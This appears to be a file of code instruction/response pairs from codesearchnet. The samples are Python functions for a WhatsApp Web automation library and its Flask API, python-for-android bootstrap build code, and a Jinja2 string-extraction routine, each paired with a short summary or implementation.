{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nfetch all messages in a chat", "response": "def get_all_messages_in_chat(self, chat, include_me=False, include_notifications=False):\n        \"\"\"\n        Fetches messages in chat\n\n        :param include_me: Include user's messages\n        :type include_me: bool or None\n        :param include_notifications: Include events happening on chat\n        :type include_notifications: bool or None\n        :return: List of messages in chat\n        :rtype: list[Message]\n        \"\"\"\n        message_objs = self.wapi_functions.getAllMessagesInChat(chat.id, include_me, include_notifications)\n\n        messages = []\n        for message in message_objs:\n            yield(factory_message(message, self))"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_all_message_ids_in_chat(self, chat, include_me=False, include_notifications=False):\n        return self.wapi_functions.getAllMessageIdsInChat(chat.id, include_me, include_notifications)", "response": "Fetches all message ids in a chat"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nfetch a message by its ID", "response": "def get_message_by_id(self, message_id):\n        \"\"\"\n        Fetch a message\n\n        :param message_id: Message ID\n        :type message_id: str\n        :return: Message or False\n        :rtype: Message\n        \"\"\"\n        result = self.wapi_functions.getMessageById(message_id)\n\n        if result:\n            result = factory_message(result, self)\n\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nfetch a contact given its ID", "response": "def get_contact_from_id(self, contact_id):\n        \"\"\"\n        Fetches a contact given its ID\n\n        :param contact_id: Contact ID\n        :type contact_id: str\n        :return: Contact or Error\n        :rtype: Contact\n        \"\"\"\n        contact = self.wapi_functions.getContact(contact_id)\n\n        if contact is None:\n            raise ContactNotFoundError(\"Contact {0} not found\".format(contact_id))\n\n        return Contact(contact, self)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nfetching a chat given its ID", "response": "def get_chat_from_id(self, chat_id):\n        \"\"\"\n        Fetches a chat given its ID\n\n        :param chat_id: Chat ID\n        :type chat_id: str\n        :return: Chat or Error\n        :rtype: Chat\n        \"\"\"\n        chat = self.wapi_functions.getChatById(chat_id)\n        if chat:\n            return factory_chat(chat, self)\n\n        raise ChatNotFoundError(\"Chat {0} not found\".format(chat_id))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_chat_from_phone_number(self, number, createIfNotFound = False):\n        for chat in self.get_all_chats():\n            if not isinstance(chat, UserChat) or number not in chat.id:\n                continue\n            return chat\n        if createIfNotFound:\n            self.create_chat_by_number(number)\n            self.wait_for_login()\n            for chat in self.get_all_chats():\n                if not isinstance(chat, UserChat) or number not in chat.id:\n                    continue\n                return chat\n\n        raise ChatNotFoundError('Chat for phone {0} not found'.format(number))", "response": "Gets chat by phone number"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the status of the driver", "response": "def get_status(self):\n        \"\"\"\n        Returns status of the driver\n\n        :return: Status\n        :rtype: WhatsAPIDriverStatus\n        \"\"\"\n        if self.driver is None:\n            return WhatsAPIDriverStatus.NotConnected\n        if self.driver.session_id is None:\n            return WhatsAPIDriverStatus.NotConnected\n        try:\n            self.driver.find_element_by_css_selector(self._SELECTORS['mainPage'])\n            return WhatsAPIDriverStatus.LoggedIn\n        except NoSuchElementException:\n            pass\n        try:\n            self.driver.find_element_by_css_selector(self._SELECTORS['qrCode'])\n            return WhatsAPIDriverStatus.NotLoggedIn\n        except NoSuchElementException:\n            pass\n        return WhatsAPIDriverStatus.Unknown"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef contact_get_common_groups(self, contact_id):\n        for group in self.wapi_functions.getCommonGroups(contact_id):\n            yield factory_chat(group, self)", "response": "Returns the groups common between a user and a contact with given id."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef convert_to_base64(self, path):\n\n        mime = magic.Magic(mime=True)\n        content_type = mime.from_file(path)\n        archive = ''\n        with open(path, \"rb\") as image_file:\n            archive = b64encode(image_file.read())\n            archive = archive.decode('utf-8')\n        return 'data:' + content_type + ';base64,' + archive", "response": "converts the file path to base64 and returns the converted string formatted for the send media function"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef send_media(self, path, chatid, caption):\n        imgBase64 = self.convert_to_base64(path)\n        filename = os.path.split(path)[-1]\n        return self.wapi_functions.sendImage(imgBase64, chatid, filename, caption)", "response": "This method is used to send a file to the chat using the sendImage function of wapi. js"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_profile_pic_from_id(self, id):\n        profile_pic = self.wapi_functions.getProfilePicFromId(id)\n        if profile_pic:\n            return b64decode(profile_pic)\n        else:\n            return False", "response": "Get full profile picture from an ID"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_profile_pic_small_from_id(self, id):\n        profile_pic_small = self.wapi_functions.getProfilePicSmallFromId(id)\n        if profile_pic:\n            return b64decode(profile_pic_small)\n        else:\n            return False", "response": "Get small profile pic from an ID"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nusing this method to delete a message from a chat", "response": "def delete_message(self, chat_id, message_array, revoke=False):\n        \"\"\"\n        Delete a chat\n\n        :param chat_id: id of chat\n        :param message_array: one or more message(s) id\n        :param revoke: Set to true so the message will be deleted for everyone, not only you\n        :return:\n        \"\"\"\n        return self.wapi_functions.deleteMessage(chat_id, message_array, revoke=False)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nchecking if a number is valid in the whatsapp service.", "response": "def check_number_status(self, number_id):\n        \"\"\"\n        Check if a number is valid/registered in the whatsapp service\n\n        :param number_id: number id\n        :return:\n        \"\"\"\n        number_status = self.wapi_functions.checkNumberStatus(number_id)\n        return NumberStatus(number_status, self)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_unread_messages(self,\n                            include_me=False,\n                            include_notifications=False):\n        \"\"\"\n        I fetch unread messages.\n\n        :param include_me: if user's messages are to be included\n        :type  include_me: bool\n\n        :param include_notifications: if events happening on chat are to be included\n        :type  include_notifications: bool\n\n        :return: list of unread messages\n        :rtype: list\n        \"\"\"\n        return list(self.driver.get_unread_messages_in_chat(\n            self.id,\n            include_me,\n            include_notifications\n        ))", "response": "I fetch unread messages."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef load_earlier_messages_till(self, last):\n        timestamp = time.mktime(last.timetuple())\n        self.driver.wapi_functions.loadEarlierMessagesTillDate(self.id, timestamp)", "response": "Triggers loading of messages till a specific point in time\n       "}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef factory_message(js_obj, driver):\n    if js_obj is None:\n        return\n\n    if \"lat\" in js_obj and \"lng\" in js_obj and js_obj[\"lat\"] and js_obj[\"lng\"]:\n        return GeoMessage(js_obj, driver)\n\n    if js_obj[\"isMedia\"]:\n        return MediaMessage(js_obj, driver)\n\n    if js_obj[\"isNotification\"]:\n        return NotificationMessage(js_obj, driver)\n\n    if 'isMMS' in js_obj and js_obj[\"isMMS\"]:\n        return MMSMessage(js_obj, driver)\n\n    if js_obj[\"type\"] in [\"vcard\", \"multi_vcard\"]:\n        return VCardMessage(js_obj, driver)\n\n    return Message(js_obj, driver)", "response": "Factory function for creating appropriate object given selenium JS object"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ninitial the global logger variable", "response": "def create_logger():\n    \"\"\"Initial the global logger variable\"\"\"\n    global logger\n\n    formatter = logging.Formatter('%(asctime)s|%(levelname)s|%(message)s')\n    handler = TimedRotatingFileHandler(log_file, when=\"midnight\", interval=1)\n    handler.setFormatter(formatter)\n    handler.setLevel(log_level)\n    handler.suffix = \"%Y-%m-%d\"\n    logger = logging.getLogger(\"sacplus\")\n    logger.setLevel(log_level)\n    logger.addHandler(handler)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ninitialises a new webwhatsapi object based on the given client_id.", "response": "def init_driver(client_id):\n    \"\"\"Initialises a new driver via webwhatsapi module\n    \n    @param client_id: ID of user client\n    @return webwhatsapi object\n    \"\"\"\n\n    # Create profile directory if it does not exist\n    profile_path = CHROME_CACHE_PATH + str(client_id)\n    if not os.path.exists(profile_path):\n        os.makedirs(profile_path)\n    \n    # Options to customize chrome window\n    chrome_options = [\n        'window-size=' + CHROME_WINDOW_SIZE,\n        '--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/60.0.3112.78 Chrome/60.0.3112.78 Safari/537.36'\n    ]\n    if CHROME_IS_HEADLESS:\n        chrome_options.append('--headless')\n    if CHROME_DISABLE_GPU:\n        chrome_options.append('--disable-gpu')\n    \n    # Create a whatsapidriver object\n    d = WhatsAPIDriver(\n        username=client_id, \n        profile=profile_path, \n        client='chrome', \n        chrome_options=chrome_options\n    )\n    return d"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef delete_client(client_id, preserve_cache):\n    if client_id in drivers:\n        drivers.pop(client_id).quit()\n        try:\n            timers[client_id].stop()\n            timers[client_id] = None\n            release_semaphore(client_id)\n            semaphores[client_id] = None\n        except:\n            pass\n\n    if not preserve_cache:\n        pth = CHROME_CACHE_PATH + g.client_id\n        shutil.rmtree(pth)", "response": "Delete all objects related to a client."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef init_timer(client_id):\n    if client_id in timers and timers[client_id]:\n        timers[client_id].start()\n        return\n    # Create a timer to call check_new_message function after every 2 seconds.\n    # client_id param is needed to be passed to check_new_message\n    timers[client_id] = RepeatedTimer(2, check_new_messages, client_id)", "response": "Create a timer for the client driver to watch for events\n    \n   "}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncheck for new unread messages and send them to the custom api", "response": "def check_new_messages(client_id):\n    \"\"\"Check for new unread messages and send them to the custom api\n\n    @param client_id: ID of client user\n    \"\"\"\n    # Return if driver is not defined or if whatsapp is not logged in.\n    # Stop the timer as well\n    if client_id not in drivers or not drivers[client_id] or not drivers[client_id].is_logged_in():\n        timers[client_id].stop()\n        return\n\n    # Acquire a lock on thread\n    if not acquire_semaphore(client_id, True):\n        return\n\n    try:\n        # Get all unread messages\n        res = drivers[client_id].get_unread()\n        # Mark all of them as seen\n        for message_group in res:\n            message_group.chat.send_seen()\n        # Release thread lock\n        release_semaphore(client_id)\n        # If we have new messages, do something with it\n        if res:\n            print(res)\n    except:\n        pass\n    finally:\n        # Release lock anyway, safekeeping\n        release_semaphore(client_id)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget the status of a perticular client.", "response": "def get_client_info(client_id):\n    \"\"\"Get the status of a perticular client, as to he/she is connected or not\n    \n    @param client_id: ID of client user\n    @return JSON object {\n        \"driver_status\": webdriver status\n        \"is_alive\": if driver is active or not\n        \"is_logged_in\": if user is logged in or not\n        \"is_timer\": if timer is running or not\n    }\n    \"\"\"\n    if client_id not in drivers:\n        return None\n\n    driver_status = drivers[client_id].get_status()\n    is_alive = False\n    is_logged_in = False\n    if (driver_status == WhatsAPIDriverStatus.NotLoggedIn\n        or driver_status == WhatsAPIDriverStatus.LoggedIn):\n        is_alive = True\n    if driver_status == WhatsAPIDriverStatus.LoggedIn:\n        is_logged_in = True\n    \n    return {\n        \"is_alive\": is_alive,\n        \"is_logged_in\": is_logged_in,\n        \"is_timer\": bool(timers[client_id]) and timers[client_id].is_running\n    }"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef create_static_profile_path(client_id):\n    profile_path = os.path.join(STATIC_FILES_PATH, str(client_id))\n    if not os.path.exists(profile_path):\n        os.makedirs(profile_path)\n    return profile_path", "response": "Create a profile path folder if not exist"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef before_request():\n    global logger\n    \n    if not request.url_rule:\n        abort(404)\n\n    if logger == None:\n        create_logger()\n    logger.info(\"API call \" + request.method + \" \" + request.url)\n\n    auth_key = request.headers.get('auth-key')\n    g.client_id = request.headers.get('client_id')\n    rule_parent = request.url_rule.rule.split('/')[1]\n    \n    if API_KEY and auth_key != API_KEY:\n        abort(401, 'you must send valid auth-key')\n        raise Exception()\n\n    if not g.client_id and rule_parent != 'admin':\n        abort(400, 'client ID is mandatory')\n\n    acquire_semaphore(g.client_id)\n\n    # Create a driver object if not exist for client requests.\n    if rule_parent != 'admin':\n        if g.client_id not in drivers:\n            drivers[g.client_id] = init_client(g.client_id)\n        \n        g.driver = drivers[g.client_id]\n        g.driver_status = WhatsAPIDriverStatus.Unknown\n        \n        if g.driver is not None:\n            g.driver_status = g.driver.get_status()\n        \n        # If driver status is unkown, means driver has closed somehow, reopen it\n        if (g.driver_status != WhatsAPIDriverStatus.NotLoggedIn\n            and g.driver_status != WhatsAPIDriverStatus.LoggedIn):\n            drivers[g.client_id] = init_client(g.client_id)\n            g.driver_status = g.driver.get_status()\n        \n        init_timer(g.client_id)", "response": "This function runs before every API request. It creates a new object and checks for required prerequisites and sets global variables for other functions to use."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate a new client driver.", "response": "def create_client():\n    \"\"\"Create a new client driver. The driver is automatically created in \n    before_request function.\"\"\"\n    result = False\n    if g.client_id in drivers:\n        result = True\n    return jsonify({'Success': result})"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef delete_client():\n    preserve_cache = request.args.get('preserve_cache', False)\n    delete_client(g.client_id, preserve_cache)\n    return jsonify({'Success': True})", "response": "Delete all objects related to client"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncapture chrome screen image and send it back.", "response": "def get_screen():\n    \"\"\"Capture chrome screen image and send it back. If the screen is currently \n    at qr scanning phase, return the image of qr only, else return image of full\n    screen\"\"\"\n    img_title = 'screen_' + g.client_id + '.png'\n    image_path = STATIC_FILES_PATH + img_title\n    if g.driver_status != WhatsAPIDriverStatus.LoggedIn:\n        try:\n            g.driver.get_qr(image_path)\n            return send_file(image_path, mimetype='image/png')\n        except Exception as err:\n            pass\n    g.driver.screenshot(image_path)\n    return send_file(image_path, mimetype='image/png')"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nget all unread messages", "response": "def get_unread_messages():\n    \"\"\"Get all unread messages\"\"\"\n    mark_seen = request.args.get('mark_seen', True)\n    unread_msg = g.driver.get_unread()\n\n    if mark_seen:\n        for msg in unread_msg:\n            msg.chat.send_seen()\n\n    return jsonify(unread_msg)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_messages(chat_id):\n\n    mark_seen = request.args.get('mark_seen', True)\n\n    chat = g.driver.get_chat_from_id(chat_id)\n    msgs = list(g.driver.get_all_messages_in_chat(chat))\n\n    for msg in msgs:\n        print(msg.id)\n\n    if mark_seen:\n        for msg in msgs:\n            try:\n                msg.chat.send_seen()\n            except:\n                pass\n    \n    return jsonify(msgs)", "response": "Return all of the chat messages in a single chat"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nsends a message to a chat", "response": "def send_message(chat_id):\n    \"\"\"Send a message to a chat\n    If a media file is found, send_media is called, else a simple text message\n    is sent\n    \"\"\"\n\n    files = request.files\n\n    if files:\n        res = send_media(chat_id, request)\n    else:\n        message = request.form.get('message')\n        res = g.driver.chat_send_message(chat_id, message)\n\n    if res:\n        return jsonify(res)\n    else:\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ndownload a media file from the message", "response": "def download_message_media(msg_id):\n    \"\"\"Download a media file\"\"\"\n    message = g.driver.get_message_by_id(msg_id)\n\n    if not message or not message.mime:\n        abort(404)\n\n    profile_path = create_static_profile_path(g.client_id)\n    filename = message.save_media(profile_path, True)\n\n    if os.path.exists(filename):\n        return send_file(filename, mimetype=message.mime)\n\n    abort(404)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_active_clients():\n    global drivers\n\n    if not drivers:\n        return jsonify([])\n\n    result = {client: get_client_info(client) for client in drivers}\n    return jsonify(result)", "response": "Get a list of all active clients and their status"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef run_clients():\n    clients = request.form.get('clients')\n    if not clients:\n        return jsonify({'Error': 'no clients provided'})\n\n    result = {}\n    for client_id in clients.split(','):\n        if client_id not in drivers:\n            init_client(client_id)\n            init_timer(client_id)\n\n        result[client_id] = get_client_info(client_id)\n\n    return jsonify(result)", "response": "Create driver for all clients"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef kill_clients():\n    clients = request.form.get('clients').split(',')\n    kill_dead = request.args.get('kill_dead', default=False)\n    kill_dead = kill_dead and kill_dead in ['true', '1']\n\n    if not kill_dead and not clients:\n        return jsonify({'Error': 'no clients provided'})\n\n    for client in list(drivers.keys()):\n        if kill_dead and not drivers[client].is_logged_in() or client in clients:\n            drivers.pop(client).quit()\n            try:\n                timers[client].stop()\n                timers[client] = None\n                release_semaphore(client)\n                semaphores[client] = None\n            except:\n                pass\n\n    return get_active_clients()", "response": "Force kill all the clients and all the others"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef driver_needed(func):\n\n    def wrapped(self, *args):\n        if not self.driver:\n            raise AttributeError(\"No driver passed to object\")\n\n        return func(self, *args)\n\n    return wrapped", "response": "Decorator for WhatsappObjectWithId methods that need to communicate with the browser"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef dist_dir(self):\n        '''The dist dir at which to place the finished distribution.'''\n        if self.distribution is None:\n            warning('Tried to access {}.dist_dir, but {}.distribution '\n                    'is None'.format(self, self))\n            exit(1)\n        return self.distribution.dist_dir", "response": "The dist dir at which to place the finished distribution."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nchecking what recipes are being built to see which of the alternative and optional dependencies are being used and returns a list of these.", "response": "def check_recipe_choices(self):\n        '''Checks what recipes are being built to see which of the alternative\n        and optional dependencies are being used,\n        and returns a list of these.'''\n        recipes = []\n        built_recipes = self.ctx.recipe_build_order\n        for recipe in self.recipe_depends:\n            if isinstance(recipe, (tuple, list)):\n                for alternative in recipe:\n                    if alternative in built_recipes:\n                        recipes.append(alternative)\n                        break\n        return sorted(recipes)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef prepare_build_dir(self):\n        '''Ensure that a build dir exists for the recipe. This same single\n        dir will be used for building all different archs.'''\n        self.build_dir = self.get_build_dir()\n        self.common_dir = self.get_common_dir()\n        copy_files(join(self.bootstrap_dir, 'build'), self.build_dir)\n        copy_files(join(self.common_dir, 'build'), self.build_dir,\n                   override=False)\n        if self.ctx.symlink_java_src:\n            info('Symlinking java src instead of copying')\n            shprint(sh.rm, '-r', join(self.build_dir, 'src'))\n            shprint(sh.mkdir, join(self.build_dir, 'src'))\n            for dirn in listdir(join(self.bootstrap_dir, 'build', 'src')):\n                shprint(sh.ln, '-s', join(self.bootstrap_dir, 'build', 'src', dirn),\n                        join(self.build_dir, 'src'))\n        with current_directory(self.build_dir):\n            with open('project.properties', 'w') as fileh:\n                fileh.write('target=android-{}'.format(self.ctx.android_api))", "response": "Ensure that a build dir exists for the recipe. This same single\n        dir will be used for building all different archs."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfinding all the available bootstraps and return them.", "response": "def list_bootstraps(cls):\n        '''Find all the available bootstraps and return them.'''\n        forbidden_dirs = ('__pycache__', 'common')\n        bootstraps_dir = join(dirname(__file__), 'bootstraps')\n        for name in listdir(bootstraps_dir):\n            if name in forbidden_dirs:\n                continue\n            filen = join(bootstraps_dir, name)\n            if isdir(filen):\n                yield name"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_bootstrap_from_recipes(cls, recipes, ctx):\n        '''Returns a bootstrap whose recipe requirements do not conflict with\n        the given recipes.'''\n        info('Trying to find a bootstrap that matches the given recipes.')\n        bootstraps = [cls.get_bootstrap(name, ctx)\n                      for name in cls.list_bootstraps()]\n        acceptable_bootstraps = []\n        for bs in bootstraps:\n            if not bs.can_be_chosen_automatically:\n                continue\n            possible_dependency_lists = expand_dependencies(bs.recipe_depends)\n            for possible_dependencies in possible_dependency_lists:\n                ok = True\n                for recipe in possible_dependencies:\n                    recipe = Recipe.get_recipe(recipe, ctx)\n                    if any([conflict in recipes for conflict in recipe.conflicts]):\n                        ok = False\n                        break\n                for recipe in recipes:\n                    try:\n                        recipe = Recipe.get_recipe(recipe, ctx)\n                    except ValueError:\n                        conflicts = []\n                    else:\n                        conflicts = recipe.conflicts\n                    if any([conflict in possible_dependencies\n                            for conflict in conflicts]):\n                        ok = False\n                        break\n                if ok and bs not in acceptable_bootstraps:\n                    acceptable_bootstraps.append(bs)\n        info('Found {} acceptable bootstraps: {}'.format(\n            len(acceptable_bootstraps),\n            [bs.name for bs in acceptable_bootstraps]))\n        if acceptable_bootstraps:\n            info('Using the first of these: {}'\n                 .format(acceptable_bootstraps[0].name))\n            return acceptable_bootstraps[0]\n        return None", "response": "Returns a bootstrap that matches the given recipes."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_bootstrap(cls, name, ctx):\n        '''Returns an instance of a bootstrap with the given name.\n\n        This is the only way you should access a bootstrap class, as\n        it sets the bootstrap directory correctly.\n        '''\n        if name is None:\n            return None\n        if not hasattr(cls, 'bootstraps'):\n            cls.bootstraps = {}\n        if name in cls.bootstraps:\n            return cls.bootstraps[name]\n        mod = importlib.import_module('pythonforandroid.bootstraps.{}'\n                                      .format(name))\n        if len(logger.handlers) > 1:\n            logger.removeHandler(logger.handlers[1])\n        bootstrap = mod.bootstrap\n        bootstrap.bootstrap_dir = join(ctx.root_dir, 'bootstraps', name)\n        bootstrap.ctx = ctx\n        return bootstrap", "response": "Returns an instance of a bootstrap with the given name."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef distribute_libs(self, arch, src_dirs, wildcard='*', dest_dir=\"libs\"):\n        '''Copy existing arch libs from build dirs to current dist dir.'''\n        info('Copying libs')\n        tgt_dir = join(dest_dir, arch.arch)\n        ensure_dir(tgt_dir)\n        for src_dir in src_dirs:\n            for lib in glob.glob(join(src_dir, wildcard)):\n                shprint(sh.cp, '-a', lib, tgt_dir)", "response": "Copy existing arch libs from build dirs to current dist dir."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncopies existing javaclasses from build dir to current dist dir.", "response": "def distribute_javaclasses(self, javaclass_dir, dest_dir=\"src\"):\n        '''Copy existing javaclasses from build dir to current dist dir.'''\n        info('Copying java files')\n        ensure_dir(dest_dir)\n        for filename in glob.glob(javaclass_dir):\n            shprint(sh.cp, '-a', filename, dest_dir)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef distribute_aars(self, arch):\n        '''Process existing .aar bundles and copy to current dist dir.'''\n        info('Unpacking aars')\n        for aar in glob.glob(join(self.ctx.aars_dir, '*.aar')):\n            self._unpack_aar(aar, arch)", "response": "Process existing. aar bundles and copy to current dist dir."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nunpacks content of. aar bundle and copy to current dist dir.", "response": "def _unpack_aar(self, aar, arch):\n        '''Unpack content of .aar bundle and copy to current dist dir.'''\n        with temp_directory() as temp_dir:\n            name = splitext(basename(aar))[0]\n            jar_name = name + '.jar'\n            info(\"unpack {} aar\".format(name))\n            debug(\"  from {}\".format(aar))\n            debug(\"  to {}\".format(temp_dir))\n            shprint(sh.unzip, '-o', aar, '-d', temp_dir)\n\n            jar_src = join(temp_dir, 'classes.jar')\n            jar_tgt = join('libs', jar_name)\n            debug(\"copy {} jar\".format(name))\n            debug(\"  from {}\".format(jar_src))\n            debug(\"  to {}\".format(jar_tgt))\n            ensure_dir('libs')\n            shprint(sh.cp, '-a', jar_src, jar_tgt)\n\n            so_src_dir = join(temp_dir, 'jni', arch.arch)\n            so_tgt_dir = join('libs', arch.arch)\n            debug(\"copy {} .so\".format(name))\n            debug(\"  from {}\".format(so_src_dir))\n            debug(\"  to {}\".format(so_tgt_dir))\n            ensure_dir(so_tgt_dir)\n            so_files = glob.glob(join(so_src_dir, '*.so'))\n            for f in so_files:\n                shprint(sh.cp, '-a', f, so_tgt_dir)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn a set of modified recipes between the current branch and the one in param.", "response": "def modified_recipes(branch='origin/master'):\n    \"\"\"\n    Returns a set of modified recipes between the current branch and the one\n    in param.\n    \"\"\"\n    # using the contrib version on purpose rather than sh.git, since it comes\n    # with a bunch of fixes, e.g. disabled TTY, see:\n    # https://stackoverflow.com/a/20128598/185510\n    git_diff = sh.contrib.git.diff('--name-only', branch)\n    recipes = set()\n    for file_path in git_diff:\n        if 'pythonforandroid/recipes/' in file_path:\n            recipe = file_path.split('/')[2]\n            recipes.add(recipe)\n    return recipes"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef build(target_python, requirements):\n    if not requirements:\n        return\n    testapp = 'setup_testapp_python2.py'\n    android_sdk_home = os.environ['ANDROID_SDK_HOME']\n    android_ndk_home = os.environ['ANDROID_NDK_HOME']\n    if target_python == TargetPython.python3:\n        testapp = 'setup_testapp_python3_sqlite_openssl.py'\n    requirements.add(target_python.name)\n    requirements = ','.join(requirements)\n    logger.info('requirements: {}'.format(requirements))\n    with current_directory('testapps/'):\n        # iterates to stream the output\n        for line in sh.python(\n                testapp, 'apk', '--sdk-dir', android_sdk_home,\n                '--ndk-dir', android_ndk_home, '--bootstrap', 'sdl2', '--requirements',\n                requirements, _err_to_out=True, _iter=True):\n            print(line)", "response": "Builds an APK given a target Python and a set of requirements."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_recipe_env(self, arch=None, with_flags_in_cc=True):\n        env = super(GeventRecipe, self).get_recipe_env(arch, with_flags_in_cc)\n        # CFLAGS may only be used to specify C compiler flags, for macro definitions use CPPFLAGS\n        regex = re.compile(r'(?:\\s|^)-[DI][\\S]+')\n        env['CPPFLAGS'] = ''.join(re.findall(regex, env['CFLAGS'])).strip()\n        env['CFLAGS'] = re.sub(regex, '', env['CFLAGS'])\n        info('Moved \"{}\" from CFLAGS to CPPFLAGS.'.format(env['CPPFLAGS']))\n        # LDFLAGS may only be used to specify linker flags, for libraries use LIBS\n        regex = re.compile(r'(?:\\s|^)-l[\\w\\.]+')\n        env['LIBS'] = ''.join(re.findall(regex, env['LDFLAGS'])).strip()\n        env['LDFLAGS'] = re.sub(regex, '', env['LDFLAGS'])\n        info('Moved \"{}\" from LDFLAGS to LIBS.'.format(env['LIBS']))\n        return env", "response": "Returns the environment dictionary for the gevent recipe."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef extract_from_ast(node, gettext_functions=GETTEXT_FUNCTIONS,\n                     babel_style=True):\n    \"\"\"Extract localizable strings from the given template node.  Per\n    default this function returns matches in babel style that means non string\n    parameters as well as keyword arguments are returned as `None`.  This\n    allows Babel to figure out what you really meant if you are using\n    gettext functions that allow keyword arguments for placeholder expansion.\n    If you don't want that behavior set the `babel_style` parameter to `False`\n    which causes only strings to be returned and parameters are always stored\n    in tuples.  As a consequence invalid gettext calls (calls without a single\n    string parameter or string parameters after non-string parameters) are\n    skipped.\n\n    This example explains the behavior:\n\n    >>> from jinja2 import Environment\n    >>> env = Environment()\n    >>> node = env.parse('{{ (_(\"foo\"), _(), ngettext(\"foo\", \"bar\", 42)) }}')\n    >>> list(extract_from_ast(node))\n    [(1, '_', 'foo'), (1, '_', ()), (1, 'ngettext', ('foo', 'bar', None))]\n    >>> list(extract_from_ast(node, babel_style=False))\n    [(1, '_', ('foo',)), (1, 'ngettext', ('foo', 'bar'))]\n\n    For every string found this function yields a ``(lineno, function,\n    message)`` tuple, where:\n\n    * ``lineno`` is the number of the line on which the string was found,\n    * ``function`` is the name of the ``gettext`` function used (if the\n      string was extracted from embedded Python code), and\n    *  ``message`` is the string itself (a ``unicode`` object, or a tuple\n       of ``unicode`` objects for functions with multiple string arguments).\n\n    This extraction function operates on the AST and is because of that unable\n    to extract any comments.  For comment support you have to use the babel\n    extraction interface or extract comments yourself.\n    \"\"\"\n    for node in node.find_all(nodes.Call):\n        if not isinstance(node.node, nodes.Name) or \\\n           node.node.name not in gettext_functions:\n            continue\n\n        strings = []\n        for arg in node.args:\n            if isinstance(arg, nodes.Const) and \\\n               isinstance(arg.value, basestring):\n                strings.append(arg.value)\n            else:\n                strings.append(None)\n\n        for arg in node.kwargs:\n            strings.append(None)\n        if node.dyn_args is not None:\n            strings.append(None)\n        if node.dyn_kwargs is not None:\n            strings.append(None)\n\n        if not babel_style:\n            strings = tuple(x for x in strings if x is not None)\n            if not strings:\n                continue\n        else:\n            if len(strings) == 1:\n                strings = strings[0]\n            else:\n                strings = tuple(strings)\n        yield node.lineno, node.node.name, strings", "response": "Extract localizable strings from the given template node."}
